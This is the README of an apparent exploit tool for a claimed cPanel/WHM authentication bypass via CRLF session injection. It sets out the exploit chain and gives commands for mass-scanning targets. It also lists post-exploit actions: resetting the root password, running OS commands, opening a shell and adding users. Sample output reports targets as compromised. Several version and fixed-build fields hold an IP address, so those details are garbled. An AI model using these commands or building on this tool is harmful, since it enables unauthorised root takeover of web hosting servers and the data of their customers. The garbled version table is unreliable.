# CP-Bypass

```
___________________         __________
\_   ___ \______   \        \______   \___.__.___________    ______ ______
/    \  \/|     ___/  ______ |    |  _<   |  |\____ \__  \  /  ___//  ___/
\     \___|    |     /_____/ |    |   \___  ||  |_> > __ \_\___ \ \___ \
 \______  /____|             |______  // ____||   __(____  /____  >____  >
        \/                          \/ \/     |__|       \/     \/     \/
```

CVE-2026-41940 — cPanel & WHM Authentication Bypass via CRLF Injection

---

## Overview

cpsrvd writes session data to disk before sanitizing CRLF characters. A crafted `Authorization: Basic` header injects attacker-controlled fields directly into the session file — including `hasroot=1` and `tfa_verified=1` — granting unauthenticated root access to WHM.

| Field    | Detail                                   |
|----------|------------------------------------------|
| CVE      | CVE-2026-41940                           |
| Vendor   | cPanel, Inc.                             |
| Product  | cPanel / WHM                             |
| Type     | Auth Bypass via Session CRLF Injection   |
| Impact   | Unauthenticated WHM root access          |
| CVSS     | 10.0 Critical                            |

---

## Affected Versions

| Branch  | Fixed Build |
|---------|-------------|
| 11.110  | 203.0.113.10 |
| 11.118  | 203.0.113.10 |
| 11.126  | 203.0.113.10 |
| 11.132  | 203.0.113.10 |
| 11.134  | 203.0.113.10 |
| 11.136  | 203.0.113.10  |

---

## Exploit Chain

```
acquire_session()   POST /login/?login_only=1 with wrong creds -> preauth cookie
poison_session()    GET / with CRLF payload in Authorization header -> token leaked
activate_session()  GET /scripts2/listaccts -> flushes raw session into auth cache
validate_access()   GET /json-api/version -> 200 + version = WHM root confirmed
```

---

## Installation

```bash
git clone https://github.com/expl0itlab/CP-Bypass
cd CP-Bypass
```

No external dependencies. stdlib only.

---

## Usage

```bash
# Single target
python3 exploit.py -u https://target.com:2087

# Scan a list of targets
python3 exploit.py -l targets.txt -t 20 -o results.json

# Override canonical hostname (useful when IP is the entry point)
python3 exploit.py -u https://203.0.113.10:2087 --hostname target.com

# Pipe from subfinder or httpx
subfinder -d target.com | httpx -p 2087 -silent | python3 exploit.py

# Post-exploit actions
python3 exploit.py -u https://target.com:2087 --action dump
python3 exploit.py -u https://target.com:2087 --action passwd --passwd NewPass@2026!
python3 exploit.py -u https://target.com:2087 --action cmd --cmd "id;uname -a"
python3 exploit.py -u https://target.com:2087 --action shell
```

---

## Options

| Flag | Description |
|------|-------------|
| `-u` | Single target URL |
| `-l` | File with targets, one per line |
| `--hostname` | Override Host header (auto-resolved if omitted) |
| `-t` | Concurrent threads (default: 10) |
| `--timeout` | Request timeout in seconds (default: 20) |
| `--rate-limit` | Delay between targets in seconds |
| `--action` | Post-exploit action: `dump`, `passwd`, `cmd`, `exec`, `info`, `shell`, `adduser` |
| `--passwd` | New root password (used with `--action passwd`) |
| `--cmd` | OS command to run (used with `--action cmd`) |
| `--new-user` | New cPanel username (used with `--action adduser`) |
| `--new-domain` | New cPanel domain (used with `--action adduser`) |
| `-o` | Save results to JSON file |
| `--no-color` | Disable ANSI color output |

---

## Output

```
13:04:21   INFO   Resolved canonical host -> target.com
13:04:22     OK   Session acquired -> :Pv0SCQj9IaTIG4b_...
13:04:23     OK   Session poisoned  -> token=/cpsess2516328209
13:04:24     OK   Cache flushed (HTTP 401 -- gadget fired)
13:04:25   INFO   validate_access: HTTP 200  {"version":"203.0.113.10",...}

  ####################################################################
  AUTH BYPASS CONFIRMED  (v11.118.0.12 -- confirmed vulnerable)
  ####################################################################
  host       target.com
  version    203.0.113.10
  token      /cpsess2516328209
  session    :Pv0SCQj9IaTIG4b_...
  access     https://target.com:2087/cpsess2516328209/json-api/version
  ####################################################################

  finished in 4.6s  --  1 scanned  --  1 hit(s)
  ────────────────────────────────────────────────────────────────────
  1 TARGET(S) COMPROMISED

  target     https://target.com:2087
  version    203.0.113.10
  token      /cpsess2516328209
  access     https://target.com:2087/cpsess2516328209/json-api/version
  session    :Pv0SCQj9IaTIG4b_...
```

---

## Disclaimer

For authorized security testing and research only. Only use against systems you have explicit written permission to test.

---

**GitHub**: [github.com/expl0itlab/CP-Bypass](https://github.com/expl0itlab/CP-Bypass)
